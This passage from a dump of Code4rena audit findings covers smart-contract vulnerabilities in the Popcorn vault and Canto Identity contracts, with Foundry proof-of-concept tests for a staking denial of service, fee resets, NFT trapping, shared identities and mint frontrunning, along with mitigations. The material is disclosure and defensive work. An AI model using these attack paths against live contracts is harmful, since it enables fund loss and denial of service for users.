controller.addStakingRewardsTokens(targets, rewardsData);      asset.mint(alice, 100 ether);     asset.approve(vault, 100 ether);     IVault(vault).deposit(100 ether, alice);     IVault(vault).approve(staking, 100 ether);      // 4. This Staking.deposit call or any other transaction will revert due to arithmetic overflow     // essentially locking all funds in the Staking contract.     IMultiRewardStaking(staking).deposit(90 ether, alice);     vm.stopPrank();   } ```  Please be reminded to fix `verifyCreatorOwner` first before running the above test. Running the test above will cause the call to `Staking.deposit` to revert with an `Arithmetic over/underflow` error which shows that the Staking contract has successfully be DOS'd. The following is the command for running the test: ``` forge test --no-match-contract 'Abstract' --match-test test__disable_any_staking_contract ```   ## Tools Used VSCode, Foundry  ## Recommended Mitigation Steps  1. https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L108-L110 - users shouldn't be allowed to deploy using just any Staking contract for their vaults. Because of this, any Vault creator can manipulate a Staking contract which leads to the DOS attack path. 2. https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L263 - add a check to limit the number of rewardTokens that can be added to the Staking contract so that it does not grow unbounded. 3. https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L371-L382 - calculation in rewards accrual should be changed so that it does not have to iterate through all rewards tokens. There should be one global index used to keep track of rewards accrual and only that one storage variable will be updated so that gas cost does not increase linearly as more rewardTokens are added."}, {"title": "Users lose their entire investment when making a deposit and resulting shares are zero", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/155", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "M-33"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/adapter/abstracts/AdapterBase.sol#L392 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/adapter/abstracts/AdapterBase.sol#L110-L122 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/adapter/abstracts/AdapterBase.sol#L147-L165   # Vulnerability details  ## Impact Users could receive `0` shares and thus lose their entire investment when making a deposit.  ## Proof of Concept  Alice calls `deposit` with `999` assets, with herself as the receiver  ```solidity function deposit(uint256 assets, address receiver)     public     virtual     override     returns (uint256) {     if (assets > maxDeposit(receiver)) revert MaxError(assets);      uint256 shares = _previewDeposit(assets);     _deposit(_msgSender(), receiver, assets, shares);      return shares; } ``` Shares are calculated through `_previewDeposit`, which uses `_convertToShares` rounding down  ```solidity function _convertToShares(uint256 assets, Math.Rounding rounding)     internal     view     virtual     override     returns (uint256 shares) {     uint256 _totalSupply = totalSupply();     uint256 _totalAssets = totalAssets();     return         (assets == 0 || _totalSupply == 0 || _totalAssets == 0)             ? assets             : assets.mulDiv(_totalSupply, _totalAssets, rounding); } ```  With specific conditions, the share calculation will round to zero.  Let's suppose that `_totalSupply = 100_000` and  `_totalAssets = 100_000_000`, then:  ```solidity assets * _totalSupply / _totalAssets => 999 * 100_000 / 100_000_000 ```  which rounds to zero, so total shares are `0`.  Finally, the deposit is completed, and the adapter mints `0 shares`.  ```solidity function _deposit(     address caller,     address receiver,     uint256 assets,     uint256 shares ) internal nonReentrant virtual override {     IERC20(asset()).safeTransferFrom(caller, address(this), assets);          uint256 underlyingBalance_ = _underlyingBalance();     _protocolDeposit(assets, shares);     // Update the underlying balance to prevent inflation attacks     underlyingBalance += _underlyingBalance() - underlyingBalance_;      _mint(receiver, shares);      harvest();      emit Deposit(caller, receiver, assets, shares); } ```  Alice has lost `999` assets and she has received nothing in return.  ## Tools Used  Manual review  ## Recommended Mitigation Steps  Revert the transaction when a deposit would result in `0` shares minted."}, {"title": "Anyone can reset fees to 0 value when Vault is deployed ", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/78", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "selected for report", "sponsor confirmed", "M-34"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L540-L546   # Vulnerability details  ## Impact Anyone can reset fees to 0 value when Vault is deployed. As result protocol will stop collecting fees.  ## Proof of Concept Anyone can call `changeFees` function in order to change `fees` variable to `proposedFees`. https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L540-L546 ```solidity     function changeFees() external {         if (block.timestamp < proposedFeeTime + quitPeriod)             revert NotPassedQuitPeriod(quitPeriod);           emit ChangedFees(fees, proposedFees);         fees = proposedFees;     } ``` There is a check that should not allow anyone to call function before `quitPeriod` has passed after fees changing was proposed. However function doesn't check that `proposedFeeTime` is not 0, so that means that after Vault has deployed, anyone can call this function the check will pass. That means that `fees` will be set to the `proposedFees`, which is 0. As result protocol will stop collecting fees.  Use this test inside Vault.t.sol. Here you can see that noone proposed fee changing, but it was changed and set fees to 0. ```solidity function test__changeFees() public {     VaultFees memory newVaultFees = VaultFees({ deposit: 0, withdrawal: 0, management: 0, performance: 0 });     //noone proposed     //vault.proposeFees(newVaultFees);      vm.warp(block.timestamp + 3 days);      vm.expectEmit(false, false, false, true, address(vault));     emit ChangedFees(VaultFees({ deposit: 0, withdrawal: 0, management: 0, performance: 0 }), newVaultFees);      vault.changeFees();      (uint256 deposit, uint256 withdrawal, uint256 management, uint256 performance) = vault.fees();     assertEq(deposit, 0);     assertEq(withdrawal, 0);     assertEq(management, 0);     assertEq(performance, 0);   } ``` ## Tools Used VsCode ## Recommended Mitigation Steps ```solidity     function changeFees() external {         if (proposedFeeTime == 0 || block.timestamp < proposedFeeTime + quitPeriod)             revert NotPassedQuitPeriod(quitPeriod);           emit ChangedFees(fees, proposedFees);         fees = proposedFees;     } ```"}, {"title": "Must approve 0 first", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/77", "labels": ["bug", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-118"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L80 https://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AutoleverageBase.sol#L147 https://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AutoleverageBase.sol#L178   # Vulnerability details  ## Impact Some tokens (like USDT) do not work when changing the allowance from an existing non-zero allowance value.They must first be approved by zero and then the actual allowance must be approved. If it's planned to use USDT for vault, this will be a problem for the Vault contract.  ## Proof of Concept  [https://github.com/tomochain/dex-smart-contract/blob/master/contracts/tokens/USDT.sol#L88-L90](https://github.com/tomochain/dex-smart-contract/blob/master/contracts/tokens/USDT.sol#L88-L90) [https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L80](https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L80)  ## Tools Used manual analysis  ## Recommended Mitigation Steps Apply the following replacement to solve the finding:  ``` function approve(address token, address spender) internal {     IERC20(token).approve(spender, 0);     IERC20(token).approve(spender, type(uint256).max); } ```"}, {"title": "Protocol loses fees because highWaterMark is updated every time someone deposit, withdraw, mint", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/70", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-11"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L138 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L215 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L480-L499 https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L447-L460   # Vulnerability details  ## Impact Protocol loses fees because highWaterMark is updated every time someone deposit, withdraw, mint.  ## Proof of Concept This bug is related to the fees accruing design. It was disscussed with the sponsor in order to understand how it should work.  Protocol has such thing as performance fee. Actually this is fee from accrued yields. If user deposited X assets and after some time he can withdraw X+Y assets for that minted amount of shares, that means that startegy has earned some Y amount of yields. Then protocol is able to get some part of that Y amount as a performance fee.  `takeFees` [modifier](https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L480-L494) is responsible for taking fees. It calls `accruedPerformanceFee` function to calculate fees amount. https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L447-L460 ```solidity     function accruedPerformanceFee() public view returns (uint256) {         uint256 highWaterMark_ = highWaterMark;         uint256 shareValue = convertToAssets(1e18);         uint256 performanceFee = fees.performance;           return             performanceFee > 0 && shareValue > highWaterMark                 ? performanceFee.mulDiv(                     (shareValue - highWaterMark) * totalSupply(),                     1e36,                     Math.Rounding.Down                 )                 : 0;     } ```  As you can see, protocol has such variable as `highWaterMark`. This variable actually should store `convertToAssets(1e18)` amount at the time when last fee were accrued or after first deposit. Then after some time when strategy earned some yields, `convertToAssets(1e18)` will return more assets than `highWaterMark`, so protocol will take fees.  But currently updating of `highWaterMark` is done incorrectly. Deposit, mint, withdraw function [use `syncFeeCheckpoint` modifier](https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L138). https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L496-L499 ```solidity     modifier syncFeeCheckpoint() {         _;         highWaterMark = convertToAssets(1e18);     } ``` This modifier will update `highWaterMark` to current assets amount that you can receive for 1e18 of shares. That means that every time when deposit, mint, withdraw is called, `highWaterMark` is updated to the new state, so protocol doesn't track yield progress anymore.  In case if protocol accrued some performance fees, which can be possible if noone called deposit, withdraw, mint for a long time, then anyone can frontrun `takeFees` and deposit small amount of assets in order to update `highWaterMark`, so protocol will not get any fees. ## Tools Used VsCode ## Recommended Mitigation Steps I believe that you need to store `highWaterMark = convertToAssets(1e18)` at the time of first deposit, or when totalShares is 0, this will be the value that protocol started with and then at time, when takefee was called you can calculate current convertToAssets(1e18) in case if it's bigger, than previous stored, then you can mint fees for protocol and update highWaterMark to current value."}, {"title": "Modifier VaultController._verifyCreatorOrOwner does not work as intented", "html_url": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/45", "labels": ["bug", "3 (High Risk)", "disagree with severity", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "H-12"], "target": "2023-01-popcorn-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/VaultController.sol#L666-L670 https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/VaultController.sol#L448 https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/VaultController.sol#L608 https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/VaultController.sol#L621 https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/VaultController.sol#L634 https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/VaultController.sol#L647   # Vulnerability details  ## Impact Modifier `VaultController._verifyCreatorOrOwner` does not work. Instead of checking the condition `msg.sender is creator OR owner`, it makes `msg.sender is creator AND owner`. This would block access to all created Vaults for creators and the owner (if he did not create them). Specifically, the following functions in the `VaultController` are affected: - `addStakingRewardsTokens()`; - `deployVault()`, which has a call to `addStakingRewardsTokens()`, cannot be executed if the argument `rewardsData.length != 0`; - `pauseAdapters()`; - `pauseVaults()`; - `unpauseAdapters()`; - `unpauseVaults()`.  ## Proof of Concept To check this concept, we can make a truth table for the main condition in the modifier `msg.sender != metadata.creator || msg.sender != owner`. The table shows that the condition will equal `false` only in the one case where `msg.sender` is both creator and owner.  | msg.sender != metadata.creator | msg.sender != owner | msg.sender != metadata.creator \\|\\| msg.sender != owner | | ------------------------------ | ------------------- | ------------------------------------------------------- | | 0                              | 0                   | 0                                                       | | 0                              | 1                   | 1                                                       | | 1                              | 0                   | 1                                                       | | 1                              | 1                   | 1                                                       |  The correct condition should be the following: `msg.sender != metadata.creator && msg.sender != owner`.  | msg.sender != metadata.creator | msg.sender != owner | msg.sender != metadata.creator && msg.sender != owner | | ------------------------------ | ------------------- | ----------------------------------------------------- | | 0                              | 0                   | 0                                                     | | 0                              | 1                   | 0                                                     | | 1                              | 0                   | 0                                                     | | 1                              | 1                   | 1                                                     |  In this case, a revert will only happen when `msg.sender` is neither a creator nor the owner, as it should be according to the documentation.  You can also use the following test to check; add it to the file `test\\vault\\VaultController.t.sol`: ```solidity function testFail__deployVault_creator_is_not_owner_audit() public {     addTemplate(\"Adapter\", templateId, adapterImpl, true, true);     addTemplate(\"Strategy\", \"MockStrategy\", strategyImpl, false, true);     addTemplate(\"Vault\", \"V1\", vaultImpl, true, true);     controller.setPerformanceFee(uint256(1000));     controller.setHarvestCooldown(1 days);     rewardToken.mint(bob, 10 ether);     rewardToken.approve(address(controller), 10 ether);      swapTokenAddresses[0] = address(0x9999);     address adapterClone = 0xD6C5fA22BBE89db86245e111044a880213b35705;     address strategyClone = 0xe8a41C57AB0019c403D35e8D54f2921BaE21Ed66;     address stakingClone = 0xE64C695617819cE724c1d35a37BCcFbF5586F752;      uint256 callTimestamp = block.timestamp;     vm.prank(bob);     address vaultClone = controller.deployVault(         VaultInitParams({             asset: iAsset,             adapter: IERC4626(address(0)),             fees: VaultFees({                 deposit: 100,                 withdrawal: 200,                 management: 300,                 performance: 400             }),             feeRecipient: feeRecipient,             owner: bob         }),         DeploymentArgs({id: templateId, data: abi.encode(uint256(100))}),         DeploymentArgs({id: \"MockStrategy\", data: \"\"}),         address(0),         abi.encode(             address(rewardToken),             0.1 ether,             1 ether,             true,             10000000,             2 days,             1 days         ),         VaultMetadata({             vault: address(0),             staking: address(0),             creator: bob,             metadataCID: metadataCid,             swapTokenAddresses: swapTokenAddresses,             swapAddress: address(0x5555),             exchange: uint256(1)         }),         0     ); } ``` In the test's log (`forge test --match-test \"testFail__deployVault_creator_is_not_owner\" -vvvv`), you can see that the call ended with revert `NotSubmitterNorOwner(0x000000000000000000000000000000000000000000000000DCbA)`.  ## Tools Used Manual Review, VSCodium, Forge  ## Recommended Mitigation Steps Change the condition to `msg.sender != metadata.creator && msg.sender != owner`."}, {"title": "Adding NFTS with AssociationType ORDERED or PRIMARY may cause overwriting", "html_url": "https://github.com/code-423n4/2023-01-canto-identity-findings/issues/187", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-01"], "target": "2023-01-canto-identity-findings", "body": "## Risk rating\r Medium Risk\r \r ## Links to affected code\r https://github.com/OpenCoreCH/cid-c4-squad/blob/4558d25aa8ea92644f3e778457fd6708104e0f24/src/CidNFT.sol#L192-L199\r \r ## Impact\r Subprotocol NFTs may be trapped in contract CidNFT forever.\r \r ## Proof of Concept\r When [adding NFT to CidNFT with AssociationType ORDERED or PRIMARY](https://github.com/OpenCoreCH/cid-c4-squad/blob/4558d25aa8ea92644f3e778457fd6708104e0f24/src/CidNFT.sol#L192-L199), the cidData is written directly, without checking and handling the case that a previously added nft may not have been removed:\r \r   ```\r   if (_type == AssociationType.ORDERED) {\r       if (!subprotocolData.ordered) revert AssociationTypeNotSupportedForSubprotocol(_type, _subprotocolName);\r       cidData[_cidNFTID][_subprotocolName].ordered[_key] = _nftIDToAdd;\r       emit OrderedDataAdded(_cidNFTID, _subprotocolName, _key, _nftIDToAdd);\r   } else if (_type == AssociationType.PRIMARY) {\r       if (!subprotocolData.primary) revert AssociationTypeNotSupportedForSubprotocol(_type, _subprotocolName);\r       cidData[_cidNFTID][_subprotocolName].primary = _nftIDToAdd;\r       emit PrimaryDataAdded(_cidNFTID, _subprotocolName, _nftIDToAdd);\r   ...\r   ```\r \r For `AssociationType.ORDERED`:\r If `(key1, subNft1)` and `(key1, subNft2)` were added consecutively, `subNft1` would be trapped in the contract forever, because `subNft1` stored in `cidData` was overwritten by `subNft2`, and only `subNft2` can be retrieved through `CidNFT.remove()`.\r \r For `AssociationType.PRIMARY`:\r If `subNft1` and `subNft2` were added consecutively, `subNft1` would be trapped in the contract forever, because `subNft1` stored in `cidData` was overwritten by `subNft2`, and only `subNft2` can be retrieved through `CidNFT.remove()`.\r \r Test code for PoC:\r ```\r diff --git a/src/test/CidNFT.t.sol b/src/test/CidNFT.t.sol\r index 8a6a87a..45d91bd 100644\r --- a/src/test/CidNFT.t.sol\r +++ b/src/test/CidNFT.t.sol\r @@ -67,6 +67,81 @@ contract CidNFTTest is DSTest, ERC721TokenReceiver {\r          vm.stopPrank();\r      }\r  \r +    function testTrappedByAddingOrdered() public {\r +        address user = user2;\r +        vm.startPrank(user);\r +\r +        // mint two nft for user\r +        (uint256 nft1, uint256 nft2) = (101, 102);\r +        sub1.mint(user, nft1);\r +        sub1.mint(user, nft2);\r +        sub1.setApprovalForAll(address(cidNFT), true);\r +        // mint CidNFT\r +        uint256 cid = cidNFT.numMinted() + 1;\r +        cidNFT.mint(new bytes[](0));\r +        uint256 key = 111;\r +\r +        // add nft1 to CidNFT a key\r +        cidNFT.add(cid, \"sub1\", key, nft1, CidNFT.AssociationType.ORDERED);\r +        // add nft2 to CidNFT with the same key\r +        cidNFT.add(cid, \"sub1\", key, nft2, CidNFT.AssociationType.ORDERED);\r +\r +        // confirm: both nft1 and nft2 have been transferred to CidNFT\r +        assertEq(sub1.ownerOf(nft1), address(cidNFT));\r +        assertEq(sub1.ownerOf(nft2), address(cidNFT));\r +\r +        // the first remove will success\r +        cidNFT.remove(cid, \"sub1\", key, nft1, CidNFT.AssociationType.ORDERED);\r +        // nft2 has been transferred back to the user\r +        assertEq(sub1.ownerOf(nft2), user);\r +\r +        // the second remove will fail for OrderedValueNotSet\r +        vm.expectRevert(abi.encodeWithSelector(CidNFT.OrderedValueNotSet.selector, cid, \"sub1\", key));\r +        cidNFT.remove(cid, \"sub1\", key, nft1, CidNFT.AssociationType.ORDERED);\r +        // nft1 is trapped in CidNFT forever\r +        assertEq(sub1.ownerOf(nft1), address(cidNFT));\r +\r +        vm.stopPrank();\r +    }\r +\r +    function testTrappedByAddingPrimary() public {\r +        address user = user2;\r +        vm.startPrank(user);\r +\r +        // mint two nft for user\r +        (uint256 nft1, uint256 nft2) = (101, 102);\r +        sub1.mint(user, nft1);\r +        sub1.mint(user, nft2);\r +        sub1.setApprovalForAll(address(cidNFT), true);\r +        // mint CidNFT\r +        uint256 cid = cidNFT.numMinted() + 1;\r +        cidNFT.mint(new bytes[](0));\r +        // key is useless when adding PRIMARY type\r +        uint256 key = 111;\r +\r +        // add nft1 to CidNFT\r +        cidNFT.add(cid, \"sub1\", key, nft1, CidNFT.AssociationType.PRIMARY);\r +        // add nft2 to CidNFT\r +        cidNFT.add(cid, \"sub1\", key, nft2, CidNFT.AssociationType.PRIMARY);\r +\r +        // confirm: both nft1 and nft2 have been transferred to CidNFT\r +        assertEq(sub1.ownerOf(nft1), address(cidNFT));\r +        assertEq(sub1.ownerOf(nft2), address(cidNFT));\r +\r +        // the first remove will success\r +        cidNFT.remove(cid, \"sub1\", key, nft1, CidNFT.AssociationType.PRIMARY);\r +        // nft2 has been transferred back to the user\r +        assertEq(sub1.ownerOf(nft2), user);\r +\r +        // the second remove will fail for PrimaryValueNotSet\r +        vm.expectRevert(abi.encodeWithSelector(CidNFT.PrimaryValueNotSet.selector, cid, \"sub1\"));\r +        cidNFT.remove(cid, \"sub1\", key, nft1, CidNFT.AssociationType.PRIMARY);\r +        // nft1 is trapped in CidNFT forever\r +        assertEq(sub1.ownerOf(nft1), address(cidNFT));\r +\r +        vm.stopPrank();\r +    }\r +\r      function testAddID0() public {\r          // Should revert if trying to add NFT ID 0\r          vm.expectRevert(abi.encodeWithSelector(CidNFT.NotAuthorizedForCIDNFT.selector, address(this), 0, address(0)));\r ```\r \r ## Tools Used\r VS Code\r \r ## Recommended Mitigation Steps\r Should revert the tx if an overwriting is found in [CidNFT.add()](https://github.com/OpenCoreCH/cid-c4-squad/blob/4558d25aa8ea92644f3e778457fd6708104e0f24/src/CidNFT.sol#L192-L199):\r ```\r diff --git a/src/CidNFT.sol b/src/CidNFT.sol\r index b6c88de..c389971 100644\r --- a/src/CidNFT.sol\r +++ b/src/CidNFT.sol\r @@ -101,6 +101,8 @@ contract CidNFT is ERC721, ERC721TokenReceiver {\r      error AssociationTypeNotSupportedForSubprotocol(AssociationType associationType, string subprotocolName);\r      error NotAuthorizedForCIDNFT(address caller, uint256 cidNFTID, address cidNFTOwner);\r      error NotAuthorizedForSubprotocolNFT(address caller, uint256 subprotocolNFTID);\r +    error OrderedKeyIsSetAlready(uint256 cidNFTID, string subprotocolName, uint256 key, uint256 nftIDToAdd);\r +    error PrimaryIsSetAlready(uint256 cidNFTID, string subprotocolName, uint256 nftIDToAdd);\r      error ActiveArrayAlreadyContainsID(uint256 cidNFTID, string subprotocolName, uint256 nftIDToAdd);\r      error OrderedValueNotSet(uint256 cidNFTID, string subprotocolName, uint256 key);\r      error PrimaryValueNotSet(uint256 cidNFTID, string subprotocolName);\r @@ -191,10 +193,16 @@ contract CidNFT is ERC721, ERC721TokenReceiver {\r          }\r          if (_type == AssociationType.ORDERED) {\r              if (!subprotocolData.ordered) revert AssociationTypeNotSupportedForSubprotocol(_type, _subprotocolName);\r +            if (cidData[_cidNFTID][_subprotocolName].ordered[_key] != 0) {\r +                revert OrderedKeyIsSetAlready(_cidNFTID, _subprotocolName, _key, _nftIDToAdd);\r +            }\r              cidData[_cidNFTID][_subprotocolName].ordered[_key] = _nftIDToAdd;\r              emit OrderedDataAdded(_cidNFTID, _subprotocolName, _key, _nftIDToAdd);\r          } else if (_type == AssociationType.PRIMARY) {\r              if (!subprotocolData.primary) revert AssociationTypeNotSupportedForSubprotocol(_type, _subprotocolName);\r +            if (cidData[_cidNFTID][_subprotocolName].primary != 0) {\r +                revert PrimaryIsSetAlready(_cidNFTID, _subprotocolName, _nftIDToAdd);\r +            }\r              cidData[_cidNFTID][_subprotocolName].primary = _nftIDToAdd;\r              emit PrimaryDataAdded(_cidNFTID, _subprotocolName, _nftIDToAdd);\r          } else if (_type == AssociationType.ACTIVE) {\r ```"}, {"title": "Multiple accounts can have the same identity", "html_url": "https://github.com/code-423n4/2023-01-canto-identity-findings/issues/177", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-01-canto-identity-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/AddressRegistry.sol#L47   # Vulnerability details  Users can register their on-chain identity (ie their CID NFT) by calling `AddressRegistry.register()`  ```solidity File: src/AddressRegistry.sol 42:     function register(uint256 _cidNFTID) external { 43:         if (ERC721(cidNFT).ownerOf(_cidNFTID) != msg.sender) 44:             // We only guarantee that a CID NFT is owned by the user at the time of registration 45:             // ownerOf reverts if non-existing ID is provided 46:             revert NFTNotOwnedByUser(_cidNFTID, msg.sender); 47:         cidNFTs[msg.sender] = _cidNFTID; 48:         emit CIDNFTAdded(msg.sender, _cidNFTID); 49:     } ```  This overwrites `cidNFTs[msg.sender]` with the `cidNFTID` provided by the caller.  The issue is that there is nothing preventing several (2 or more) accounts to point to the same `cidNFTID`, ie have `cidNFTs[userA] == cidNFTs[userB]`  Note: the README mentioned that  ``` Transferring CID NFTs that are still referenced in the address registry: CID NFTs are transferrable on purpose and a user can transfer his CID NFT while it is still registered to his address if he wants to do so. ```  The issue described in this report is not that the CID NFT is transferrable, but that several accounts can point to the same CIDNFT id, which lead to several problems outlined below.   ## Impact   Quoting the README: ``` Canto Identity NFTs (CID NFTs) represent individual on-chain identities ```   Here, several accounts can point to the same on-chain identity, breaking the requirement that the said identity should be **individual**  To illustrate the consequences of this, let us look at `CidNFT.add()`, which adds a new entry for the given subprotocol to the provided CID NFT: - data is added by transferring a subprotocol NFT to the contract, which will write the NFT id in `cidData[_cidNFTID][_subprotocolName]` - This NFT id represents traits that will be associated with the identity.  Because of the issue outlined above, the identity system can be abused:   - Alice registers her CIDNft by calling `addressRegistry.register(N)` - she transfers it to Bob, who then proceeds to call `addressRegistry.register(N)` to register it. - at this point, `cidNFT` of id `N` points to both Alice and Bob: `addressRegistry.getCID(Alice) == addressRegistry.getCID(Bob)` - Bob calls `CidNFT.add()` to add a subProtocol NFT X to his identity `N` . Because Alice is also associated to the `CIDNFT` `N`, she essentially added this trait for free (assuming subprotocols will monetize their tokens, Bob had to pay the cost of the subProtocol NFT X, but Alice did not). - This can also have further consequences depending on what can be done with these traits (e.g: a protocol giving rewards for users with a trait of the subProtocol NFT X, Bob could be front run by Alice and not receive a reward he was entitled to)  Overall, because this issue impacts a key aspect of the protocol (identities are not individual) and can lead to a form of `theft` in certain conditions (in the scenario above, Alice got a trait added to her identity for \"free\"), the Medium severity seems appropriate.   ## Proof Of Concept This test shows how two users can point to the same `CID`. Add it to `AddressRegistry.t.sol`  ```solidity function testTwoUsersSameCID() public {     uint256 nftIdOne = 1;     address Alice = users[0];     address Bob = users[1];      // 1 - Alice mints NFT     vm.startPrank(Alice);     bytes[] memory addList;     cidNFT.mint(addList);     assertEq(cidNFT.ownerOf(nftIdOne), Alice);      // 2 - Alice registers the NFT     addressRegistry.register(nftIdOne);      // 3 - Alice transfers the CID NFT to Bob     cidNFT.transferFrom(Alice, Bob, nftIdOne);     vm.stopPrank();      // 4 - Bob registers the nft     vm.startPrank(Bob);     addressRegistry.register(nftIdOne);      // 5 - Alice and Bob have the same identity     uint256 cidAlice = addressRegistry.getCID(Alice);     uint256 cidBob = addressRegistry.getCID(Bob);     assertEq(cidAlice, cidBob); } ```   ## Tools Used  Manual Analysis, Foundry  ## Mitigation  `AddressRegistry` should have an additional mapping to track the account associated with a given `cifNTFID`.  ```diff File: src/AddressRegistry.sol 20:     /// @notice Stores the mappings of users to their CID NFT 21:     mapping(address => uint256) private cidNFTs; +       mapping(uint256 => address) private accounts; ```  When registering, the code would check if the `cidNFTID` has an account associated with it. If that is the case, `cidNFTs` for this user would be set to 0, preventing several users from having the same identity.  ```diff File: src/AddressRegistry.sol 42: function register(uint256 _cidNFTID) external { 43:         if (ERC721(cidNFT).ownerOf(_cidNFTID) != msg.sender) 44:             // We only guarantee that a CID NFT is owned by the user at the time of registration 45:             // ownerOf reverts if non-existing ID is provided 46:             revert NFTNotOwnedByUser(_cidNFTID, msg.sender); +           if (accounts[_cidNFTID] != address(0)) { +                 delete cidNFTs[accounts[_cidNFTID]]; +                 emit CIDNFTRemoved(accounts[_cidNFTID], _cidNFTID); +} 47:         cidNFTs[msg.sender] = _cidNFTID; +           accounts[_cidNFTID] = msg.sender; 48:         emit CIDNFTAdded(msg.sender, _cidNFTID); 49:     } ```"}, {"title": "Griefing risk in `mint`", "html_url": "https://github.com/code-423n4/2023-01-canto-identity-findings/issues/115", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-01-canto-identity-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L147-L157 https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L177-L182   # Vulnerability details  ## Impact `CidNFT.mint()` has an optional parameter `_addList` that enables users to register subprotocol NFTs to the CID NFT right after the mint.  However, there is no guarantee that the `_cidNFTID`  encoded in `_addList` is the same ID as the newly minted NFT. If there is a pending mint transaction and another user frontrun the mint transaction with higher fee, the previous transaction will revert as the `_cidNFTID` is no longer the expected ID.  [CidNFT.sol#L177-L182](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L177-L182) ```solidity address cidNFTOwner = ownerOf[_cidNFTID]; if (     cidNFTOwner != msg.sender &&     getApproved[_cidNFTID] != msg.sender &&     !isApprovedForAll[cidNFTOwner][msg.sender] ) revert NotAuthorizedForCIDNFT(msg.sender, _cidNFTID, cidNFTOwner); ``` A malicious actor can grief this by frontrunning users that try to mint with non-zero `_addList`, causing their mint transaction to fail.   In absence of malicious actor, it is also possible for this issue to happen randomly during busy period where a lot of users are trying to mint at the same time.  ## Proof of Concept - The next CidNFT mint ID is `1000`. - Alice wants to mint and prepares `_addList` with the expected `_cidNFTID` of `1000`. - Bob saw Alice's transaction and frontran her, incrementing the next minting ID to `1001`. - Alice's transaction tries to add subprotocol NFTs to ID `1000` which is owned by Bob. This causes the transaction to revert.  ## Recommended Mitigation Steps Modify `mint` so that the minted ID is the one used during the `add` loop, ensuring that `mint` will always succeed."}, {"title": "`CidNFT`: Broken `tokenURI` function", "html_url": "https://github.com/code-423n4/2023-01-canto-identity-findings/issues/89", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-04"], "target": "2023-01-canto-identity-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L140   # Vulnerability details  [`CidNFT#tokenURI`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L133-L142) does not convert the `uint256 _id` argument to a string before interpolating it in the token URI:  ```solidity     /// @notice Get the token URI for the provided ID     /// @param _id ID to retrieve the URI for     /// @return tokenURI The URI of the queried token (path to a JSON file)     function tokenURI(uint256 _id) public view override returns (string memory) {         if (ownerOf[_id] == address(0))             // According to ERC721, this revert for non-existing tokens is required             revert TokenNotMinted(_id);         return 